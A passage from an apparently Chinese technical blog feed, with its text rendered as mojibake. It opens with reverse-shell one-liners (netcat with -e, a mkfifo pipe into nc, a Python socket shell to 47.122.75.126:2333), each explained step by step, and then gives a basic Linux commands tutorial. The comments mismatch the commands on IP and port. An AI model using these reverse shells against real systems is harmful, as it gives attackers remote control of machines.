2333<br>/*<br>å¯¹äºä¸€äº›è¾ƒæ—§çš„ncç‰ˆæœ¬å¯ä»¥ä½¿ç”¨ã€‚<br>ncï¼ˆNetcatï¼‰ï¼šä¸€ä¸ªå¼ºå¤§çš„ç½‘ç»œå·¥å…·ï¼Œå¯ç”¨äºå„ç§ç½‘ç»œæ“ä½œ<br>-eï¼šæŒ‡å®šè¿æ¥æˆåŠŸåæ‰§è¡Œçš„ç¨‹åºï¼Œè¿™é‡Œå°† /bin/bash ä½œä¸ºç¨‹åºï¼Œå³ä¸€æ—¦ä¸ 47.122.75.126 çš„ 2333 ç«¯å£å»ºç«‹è¿æ¥ï¼Œå°±ä¼šæ‰§è¡Œ /bin/bash å¹¶å°†å…¶ä½œä¸ºshellæä¾›ç»™å¯¹æ–¹ã€‚<br>*/<br>----------------------------------------<br><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.1.100 2333 &gt;/tmp/f<br>/*<br>å¯¹äºè¾ƒæ–°çš„ nc ç‰ˆæœ¬ï¼Œå¯èƒ½ä¸æ”¯æŒ -e é€‰é¡¹ï¼Œå¯ä»¥ç”¨è¿™ä¸ªå‘½ä»¤æ¥ä»£æ›¿<br><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/fï¼šåˆ é™¤ /tmp/f ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªå‘½ä»¤ç®¡é“ /tmp/f<br><span class="hljs-built_in">cat</span> /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.1.100 4444 &gt;/tmp/fï¼šä½¿ç”¨ç®¡é“å°† <span class="hljs-built_in">cat</span> ä»å‘½åç®¡é“è¯»å–çš„æ•°æ®é€ç»™ bash -iï¼Œå°† bash çš„æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œå†é€šè¿‡ nc å‘é€ç»™ 47.122.75.126 çš„ 4444 ç«¯å£ï¼ŒåŒæ—¶ nc æ¥æ”¶çš„æ•°æ®é‡å®šå‘å›å‘½åç®¡é“ï¼Œå½¢æˆä¸€ä¸ªåŒå‘é€šä¿¡é€šé“ã€‚<br>*/<br>----------------------------------------<br>python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.122.75.126&quot;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br>/*<br>ä½¿ç”¨ python å®ç°åå¼¹shell<br>import socket,subprocess,osï¼šå¯¼å…¥æ‰€éœ€çš„æ¨¡å—ï¼Œsocket ç”¨äºç½‘ç»œè¿æ¥ï¼Œsubprocess ç”¨äºæ‰§è¡Œå¤–éƒ¨å‘½ä»¤ï¼Œos ç”¨äºæ–‡ä»¶æè¿°ç¬¦æ“ä½œã€‚<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)ï¼šåˆ›å»ºä¸€ä¸ª IPv4 çš„ TCP å¥—æ¥å­—ã€‚<br>s.connect((&quot;<span class="hljs-number">47.122</span>.<span class="hljs-number">75.126</span>&quot;,<span class="hljs-number">2333</span>))ï¼šè¿æ¥åˆ° 47.122.75.126 çš„ 2333 ç«¯å£ã€‚<br>os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)ï¼šå°†å¥—æ¥å­—çš„æ–‡ä»¶æè¿°ç¬¦å¤åˆ¶åˆ°æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œå®ç°é€šè¿‡å¥—æ¥å­—çš„è¾“å…¥è¾“å‡ºåŠŸèƒ½ã€‚<br>p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])ï¼šæ‰§è¡Œä¸€ä¸ªäº¤äº’å¼çš„ bash shellã€‚<br>*/<br>----------------------------------------<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å°çŸ¥è¯†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å°çŸ¥è¯†</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LinuxåŸºç¡€æŒ‡ä»¤</title>
    <link href="/2025/04/25/Linux%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4/"/>
    <url>/2025/04/25/Linux%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="LinuxåŸºç¡€æŒ‡ä»¤"><a href="#LinuxåŸºç¡€æŒ‡ä»¤" class="headerlink" title="LinuxåŸºç¡€æŒ‡ä»¤"></a>LinuxåŸºç¡€æŒ‡ä»¤</h1><h2 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h2><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> [é€‰é¡¹] [ç›®å½•æˆ–æ–‡ä»¶]<br></code></pre></td></tr></table></figure><h3 id="åŠŸèƒ½"><a href="#åŠŸèƒ½" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h3><p>å¯¹äºç›®å½•ï¼Œè¯¥å‘½ä»¤åˆ—å‡ºè¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰å­ç›®å½•ä¸æ–‡ä»¶ã€‚å¯¹äºæ–‡ä»¶ï¼Œå°†åˆ—å‡ºæ–‡ä»¶åä»¥åŠå…¶ä»–ä¿¡æ¯ã€‚</p><h3 id="å¸¸ç”¨é€‰é¡¹"><a href="#å¸¸ç”¨é€‰é¡¹" class="headerlink" title="å¸¸ç”¨é€‰é¡¹"></a>å¸¸ç”¨é€‰é¡¹</h3><ul><li>-a    åˆ—å‡ºç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬ä»¥ . å¼€å¤´çš„éšå«æ–‡ä»¶ã€‚ </li><li>-d    å°†ç›®å½•è±¡æ–‡ä»¶ä¸€æ ·æ˜¾ç¤ºï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºå…¶ä¸‹çš„æ–‡ä»¶ã€‚ å¦‚ï¼šls â€“d æŒ‡å®šç›®å½• </li><li>-i     è¾“å‡ºæ–‡ä»¶çš„ i èŠ‚ç‚¹çš„ç´¢å¼•ä¿¡æ¯ã€‚ å¦‚ ls â€“ai æŒ‡å®šæ–‡ä»¶ </li><li>-k    ä»¥ k å­—èŠ‚çš„å½¢å¼è¡¨ç¤ºæ–‡ä»¶çš„å¤§å°ã€‚ls â€“alk æŒ‡å®šæ–‡ä»¶ </li><li>-l     åˆ—å‡ºæ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ã€‚ </li><li>-t     ä»¥æ—¶é—´æ’åºã€‚ </li><li>-R    åˆ—å‡ºæ‰€æœ‰å­ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚(é€’å½’)</li></ul><h3 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -a<br></code></pre></td></tr></table></figure><h2 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h2><h3 id="è¯­æ³•-1"><a href="#è¯­æ³•-1" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">pwd</span><br></code></pre></td></tr></table></figure><h3 id="åŠŸèƒ½-1"><a href="#åŠŸèƒ½-1" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h3><p>æ˜¾ç¤ºç”¨æˆ·å½“å‰æ‰€åœ¨çš„ç›®å½•</p><h2 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h2><h3 id="è¯­æ³•-2"><a href="#è¯­æ³•-2" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> [ç›®å½•å]<br></code></pre></td></tr></table></figure><h3 id="åŠŸèƒ½-2"><a href="#åŠŸèƒ½-2" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h3><p>æ”¹å˜å·¥ä½œç›®å½•ã€‚å°†å½“å‰å·¥ä½œç›®å½•æ”¹å˜åˆ°æŒ‡å®šçš„ç›®å½•ä¸‹ã€‚</p><h3 id="ä¸¾ä¾‹-1"><a href="#ä¸¾ä¾‹-1" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">è¿”å›ä¸Šçº§ç›®å½•<span class="hljs-built_in">cd</span> ../<br>ç»å¯¹è·¯å¾„ <span class="hljs-built_in">cd</span> /home/litao/linux/<br>ç›¸å¯¹è·¯å¾„ <span class="hljs-built_in">cd</span> ../day02/<br>è¿›å…¥ç”¨æˆ·å®¶ç›®<span class="hljs-built_in">cd</span> ~<br>è¿”å›æœ€è¿‘è®¿é—®ç›®å½•   <span class="hljs-built_in">cd</span> -<br></code></pre></td></tr></table></figure><h2 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h2><h3 id="è¯­æ³•-3"><a href="#è¯­æ³•-3" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> [ é€‰é¡¹ ]... æ–‡ä»¶ ...<br></code></pre></td></tr></table></figure><h3 id="åŠŸèƒ½-3"><a href="#åŠŸèƒ½-3" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h3><p>touch å‘½ä»¤å‚æ•°å¯æ›´æ”¹æ–‡æ¡£æˆ–ç›®å½•çš„æ—¥æœŸæ—¶é—´ï¼ŒåŒ…æ‹¬å­˜å–æ—¶é—´å’Œæ›´æ”¹æ—¶é—´ï¼Œæˆ–è€…æ–°å»ºä¸€ä¸ªä¸å­˜åœ¨ çš„æ–‡ä»¶ã€‚</p><h3 id="å¸¸ç”¨é€‰é¡¹-1"><a href="#å¸¸ç”¨é€‰é¡¹-1" class="headerlink" title="å¸¸ç”¨é€‰é¡¹"></a>å¸¸ç”¨é€‰é¡¹</h3><ul><li>-a æˆ–â€“time&#x3D;atimeæˆ–â€“time&#x3D;accessæˆ–â€“time&#x3D;useåªæ›´æ”¹å­˜å–æ—¶é—´ã€‚</li><li>-d ä½¿ç”¨æŒ‡å®šçš„æ—¥æœŸæ—¶é—´ï¼Œè€Œéç°åœ¨çš„æ—¶é—´ã€‚</li><li>-f æ­¤å‚æ•°å°†å¿½ç•¥ä¸äºˆå¤„ç†ï¼Œä»…è´Ÿè´£è§£å†³BSDç‰ˆæœ¬touchæŒ‡ä»¤çš„å…¼å®¹æ€§é—®é¢˜ã€‚</li><li>-m æˆ–â€“time&#x3D;mtimeæˆ–â€“time&#x3D;modify åªæ›´æ”¹å˜åŠ¨æ—¶é—´ã€‚</li><li>-r æŠŠæŒ‡å®šæ–‡æ¡£æˆ–ç›®å½•çš„æ—¥æœŸæ—¶é—´ï¼Œç»Ÿç»Ÿè®¾æˆå’Œå‚è€ƒæ–‡æ¡£æˆ–ç›®å½•çš„æ—¥æœŸæ—¶é—´ç›¸åŒã€‚</li><li>-t ä½¿ç”¨æŒ‡å®šçš„æ—¥æœŸæ—¶é—´ï¼Œè€Œéç°åœ¨çš„æ—¶é—´ã€‚</li></ul><h3 id="ä¸¾ä¾‹-2"><a href="#ä¸¾ä¾‹-2" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h3><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> study.txt<br></code></pre></td></tr></table></figure><p>æ‰¹é‡åˆ›å»ºæ–‡ä»¶</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">touch &#123;a,b,c&#125;<span class="hljs-string">.txt</span><br>touch &#123;0.<span class="hljs-string">.9</span>&#125;<span class="hljs-string">.txt</span><br></code></pre></td></tr></table></figure><h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><h3 id="è¯­æ³•-4"><a href="#è¯­æ³•-4" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> [ é€‰é¡¹ ] æºæ–‡ä»¶æˆ–ç›®å½• ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½•<br></code></pre></td></tr></table></figure><h3 id="åŠŸèƒ½-4"><a href="#åŠŸèƒ½-4" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h3><p>å¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•</p><h3 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h3><p>cp æŒ‡ä»¤ç”¨äºå¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•ï¼Œå¦‚åŒæ—¶æŒ‡å®šä¸¤ä¸ªä»¥ä¸Šçš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œä¸”æœ€åçš„ç›®çš„åœ°æ˜¯ä¸€ä¸ªå·²ç»å­˜ åœ¨çš„ç›®å½•ï¼Œåˆ™å®ƒä¼šæŠŠå‰é¢æŒ‡å®šçš„æ‰€æœ‰æ–‡ä»¶æˆ–ç›®å½•å¤åˆ¶åˆ°æ­¤ç›®å½•ä¸­ã€‚è‹¥åŒæ—¶æŒ‡å®šå¤šä¸ªæ–‡ä»¶æˆ–ç›®å½•ï¼Œè€Œæœ€å çš„ç›®çš„åœ°å¹¶éä¸€ä¸ªå·²å­˜åœ¨çš„ç›®å½•ï¼Œåˆ™ä¼šå‡ºç°é”™è¯¯ä¿¡æ¯</p><h3 id="å¸¸ç”¨é€‰é¡¹-2"><a href="#å¸¸ç”¨é€‰é¡¹-2" class="headerlink" title="å¸¸ç”¨é€‰é¡¹"></a>å¸¸ç”¨é€‰é¡¹</h3><ul><li>-f æˆ– â€“force å¼ºè¡Œå¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•ï¼Œ ä¸è®ºç›®çš„æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å·²ç»å­˜åœ¨</li><li>-i æˆ– â€“interactive è¦†ç›–æ–‡ä»¶ä¹‹å‰å…ˆè¯¢é—®ç”¨æˆ·</li><li>-r é€’å½’å¤„ç†ï¼Œå°†æŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶ä¸å­ç›®å½•ä¸€å¹¶å¤„ç†ã€‚è‹¥æºæ–‡ä»¶æˆ–ç›®å½•çš„å½¢æ€ï¼Œä¸å±äºç›®å½•æˆ–ç¬¦å· é“¾æ¥ï¼Œ åˆ™ä¸€å¾‹è§†ä¸ºæ™®é€šæ–‡ä»¶å¤„ç†</li><li>-R æˆ– â€“recursive é€’å½’å¤„ç†ï¼Œå°†æŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶åŠå­ç›®å½•ä¸€å¹¶å¤„ç†</li></ul><h3 id="ä¸¾ä¾‹-3"><a href="#ä¸¾ä¾‹-3" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h3><p>å¤åˆ¶æ–‡ä»¶åªéœ€è¦å°†æºæ–‡ä»¶å’Œç›®æ ‡æ–‡ä»¶åç§°ä¸€èµ·é”®å…¥å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> text1.txt new_file.txt<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ä½¿ç”¨é€’å½’æ ‡å¿—å¤åˆ¶æ•´ä¸ªç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> -r test1/ test2/<br></code></pre></td></tr></table></figure><h2 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h2><p>mvå‘½ä»¤æ˜¯moveçš„ç¼©å†™ï¼Œå¯ä»¥ç”¨æ¥ç§»åŠ¨æ–‡ä»¶æˆ–è€…å°†æ–‡ä»¶æ”¹åï¼ˆmove (rename) filesï¼‰ï¼Œæ˜¯Linuxç³»ç»Ÿä¸‹å¸¸ ç”¨çš„å‘½ä»¤ï¼Œ ç»å¸¸ç”¨æ¥å¤‡ä»½æ–‡ä»¶æˆ–è€…ç›®å½•ã€‚</p><h3 id="è¯­æ³•-5"><a href="#è¯­æ³•-5" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> [é€‰é¡¹] æºæ–‡ä»¶æˆ–ç›®å½• ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½•<br></code></pre></td></tr></table></figure><h3 id="åŠŸèƒ½-5"><a href="#åŠŸèƒ½-5" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h3><ol><li>è§†mvå‘½ä»¤ä¸­ç¬¬äºŒä¸ªå‚æ•°ç±»å‹çš„ä¸åŒï¼ˆæ˜¯ç›®æ ‡æ–‡ä»¶è¿˜æ˜¯ç›®æ ‡ç›®å½•ï¼‰ï¼Œmvå‘½ä»¤å°†æ–‡ä»¶é‡å‘½åæˆ–å°†å…¶ç§» è‡³ä¸€ä¸ªæ–°çš„ ç›®å½•ä¸­ã€‚</li><li>å½“ç¬¬äºŒä¸ªå‚æ•°ç±»å‹æ˜¯æ–‡ä»¶æ—¶ï¼Œmvå‘½ä»¤å®Œæˆæ–‡ä»¶é‡å‘½åï¼Œæ­¤æ—¶ï¼Œæºæ–‡ä»¶åªèƒ½æœ‰ä¸€ä¸ªï¼ˆä¹Ÿå¯ä»¥æ˜¯æºç›®å½• åï¼‰ï¼Œå®ƒå°† æ‰€ç»™çš„æºæ–‡ä»¶æˆ–ç›®å½•é‡å‘½åä¸ºç»™å®šçš„ç›®æ ‡æ–‡ä»¶åã€‚</li><li>å½“ç¬¬äºŒä¸ªå‚æ•°æ˜¯å·²å­˜åœ¨çš„ç›®å½•åç§°æ—¶ï¼Œæºæ–‡ä»¶æˆ–ç›®å½•å‚æ•°å¯ä»¥æœ‰å¤šä¸ªï¼Œmvå‘½ä»¤å°†å„å‚æ•°æŒ‡å®šçš„æºæ–‡ ä»¶å‡ç§»è‡³ç›® æ ‡ç›®å½•ä¸­ã€‚</li></ol><h3 id="å¸¸ç”¨é€‰é¡¹-3"><a href="#å¸¸ç”¨é€‰é¡¹-3" class="headerlink" title="å¸¸ç”¨é€‰é¡¹"></a>å¸¸ç”¨é€‰é¡¹</h3><ul><li>-f ï¼šforce å¼ºåˆ¶çš„æ„æ€ï¼Œå¦‚æœç›®æ ‡æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œä¸ä¼šè¯¢é—®è€Œç›´æ¥è¦†ç›–</li><li>-i ï¼šè‹¥ç›®æ ‡æ–‡ä»¶ (destination) å·²ç»å­˜åœ¨æ—¶ï¼Œå°±ä¼šè¯¢é—®æ˜¯å¦è¦†ç›–ï¼</li></ul><h3 id="ä¸¾ä¾‹-4"><a href="#ä¸¾ä¾‹-4" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h3><p>å¦‚æœæƒ³è¦ç§»åŠ¨æ–‡ä»¶åˆ°å¦ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œéœ€è¦è¾“å…¥å¯¹åº”æ–‡ä»¶å¤¹çš„å®Œæ•´è·¯å¾„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> filename.txt /home/grill<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚å‡†å¤‡é‡å‘½åæ–‡ä»¶ï¼ŒåŒæ—¶ä¿ç•™åœ¨åŒä¸€ç›®å½•ä¸­å¯ä»¥è¾“å…¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> old_file.txt new_named_file.txt<br></code></pre></td></tr></table></figure><h2 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h2><h3 id="è¯­æ³•-6"><a href="#è¯­æ³•-6" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> [é€‰é¡¹] <span class="hljs-built_in">dirname</span>... <br></code></pre></td></tr></table></figure><h3 id="åŠŸèƒ½-6"><a href="#åŠŸèƒ½-6" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h3><p>åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º â€œdirnameâ€ çš„ç›®å½•</p><h3 id="å¸¸ç”¨é€‰é¡¹-4"><a href="#å¸¸ç”¨é€‰é¡¹-4" class="headerlink" title="å¸¸ç”¨é€‰é¡¹"></a>å¸¸ç”¨é€‰é¡¹</h3><ul><li>-pã€â€“parents å¯ä»¥æ˜¯ä¸€ä¸ªè·¯å¾„åç§°ã€‚æ­¤æ—¶è‹¥è·¯å¾„ä¸­çš„æŸäº›ç›®å½•å°šä¸å­˜åœ¨,åŠ ä¸Šæ­¤é€‰é¡¹å,ç³»ç»Ÿå°†è‡ªåŠ¨å»ºç«‹å¥½ é‚£äº›å°šä¸å­˜åœ¨çš„ç›®å½•,å³ä¸€æ¬¡å¯ä»¥å»ºç«‹å¤šä¸ªç›®å½•</li></ul><h3 id="ä¸¾ä¾‹-5"><a href="#ä¸¾ä¾‹-5" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> images/åˆ›å»ºä¸€ä¸ªä¿å­˜æ‰€ä»¥å›¾åƒçš„ç›®å½•<br><span class="hljs-built_in">mkdir</span> -p test1/test2 é€’å½’å»ºç«‹å¤šä¸ªç›®å½•<br></code></pre></td></tr></table></figure><h2 id="rmdir"><a href="#rmdir" class="headerlink" title="rmdir"></a>rmdir</h2><p>rmdir æ˜¯ä¸€ä¸ªä¸ mkdir ç›¸å¯¹åº”çš„å‘½ä»¤ã€‚ mkdir æ˜¯å»ºç«‹ç›®å½•ï¼Œè€Œ rmdir æ˜¯åˆ é™¤å‘½ä»¤ã€‚</p><h3 id="è¯­æ³•-7"><a href="#è¯­æ³•-7" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rmdir</span> [-p] [dirName]<br></code></pre></td></tr></table></figure><h3 id="é€‚ç”¨å¯¹è±¡"><a href="#é€‚ç”¨å¯¹è±¡" class="headerlink" title="é€‚ç”¨å¯¹è±¡"></a>é€‚ç”¨å¯¹è±¡</h3><p>å…·æœ‰å½“å‰ç›®å½•æ“ä½œæƒé™çš„æ‰€æœ‰ä½¿ç”¨è€…</p><h3 id="åŠŸèƒ½-7"><a href="#åŠŸèƒ½-7" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h3><p>åˆ é™¤ç©ºç›®å½•</p><h3 id="å¸¸ç”¨é€‰é¡¹-5"><a href="#å¸¸ç”¨é€‰é¡¹-5" class="headerlink" title="å¸¸ç”¨é€‰é¡¹"></a>å¸¸ç”¨é€‰é¡¹</h3><ul><li>p å½“å­ç›®å½•è¢«åˆ é™¤åå¦‚æœçˆ¶ç›®å½•ä¹Ÿå˜æˆç©ºç›®å½•çš„è¯ï¼Œå°±è¿å¸¦çˆ¶ç›®å½•ä¸€èµ·åˆ é™¤ã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rmdir</span> test1<br></code></pre></td></tr></table></figure><h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><p>rm å‘½ä»¤å¯ä»¥åŒæ—¶åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•</p><h3 id="è¯­æ³•-8"><a href="#è¯­æ³•-8" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> [-f-i-r-v] [dirName/dir]<br></code></pre></td></tr></table></figure><h3 id="é€‚ç”¨å¯¹è±¡-1"><a href="#é€‚ç”¨å¯¹è±¡-1" class="headerlink" title="é€‚ç”¨å¯¹è±¡"></a>é€‚ç”¨å¯¹è±¡</h3><p>æ‰€æœ‰ä½¿ç”¨è€…</p><h3 id="åŠŸèƒ½-8"><a href="#åŠŸèƒ½-8" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h3><p>åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•</p><h3 id="å¸¸ç”¨é€‰é¡¹-6"><a href="#å¸¸ç”¨é€‰é¡¹-6" class="headerlink" title="å¸¸ç”¨é€‰é¡¹"></a>å¸¸ç”¨é€‰é¡¹</h3><ul><li>-f å³ä½¿æ–‡ä»¶å±æ€§ä¸ºåªè¯»(å³å†™ä¿æŠ¤)ï¼Œäº¦ç›´æ¥åˆ é™¤</li><li>-i åˆ é™¤å‰é€ä¸€è¯¢é—®ç¡®è®¤</li><li>-r åˆ é™¤ç›®å½•åŠå…¶ä¸‹æ‰€æœ‰æ–‡ä»¶</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> text.txt<br></code></pre></td></tr></table></figure><p>åˆ é™¤æ–‡ä»¶å¤¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -r test1<br></code></pre></td></tr></table></figure><h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><p>Linux sudoå‘½ä»¤ä»¥ç³»ç»Ÿç®¡ç†è€…çš„èº«ä»½æ‰§è¡ŒæŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç»ç”± sudo æ‰€æ‰§è¡Œçš„æŒ‡ä»¤å°±å¥½åƒæ˜¯ root äº²è‡ª æ‰§è¡Œã€‚</p><p>sudoé€šå¸¸ç”¨äºå®‰è£…è½¯ä»¶æˆ–ç¼–è¾‘ç”¨æˆ·ä¸»ç›®å½•ä»¥å¤–çš„æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install strings<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cd</span> /root/<br></code></pre></td></tr></table></figure><p>åœ¨è¿è¡Œé”®å…¥çš„å‘½ä»¤å‰ï¼Œå®ƒä¼šè¦æ±‚è¾“å…¥ç®¡ç†å‘˜å¯†ç </p><p>å¼€å¯root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -i<br></code></pre></td></tr></table></figure><h2 id="vimï¼ˆviï¼‰ç¼–è¾‘å‘æ³•"><a href="#vimï¼ˆviï¼‰ç¼–è¾‘å‘æ³•" class="headerlink" title="vimï¼ˆviï¼‰ç¼–è¾‘å‘æ³•"></a>vimï¼ˆviï¼‰ç¼–è¾‘å‘æ³•</h2><p>ç›´æ¥è¾“å…¥ï¼Œå°±å¯ä»¥ç¼–è¾‘æ–‡ä»¶ï¼Œæ²¡æœ‰æ–‡ä»¶ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ª</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi filename.txt 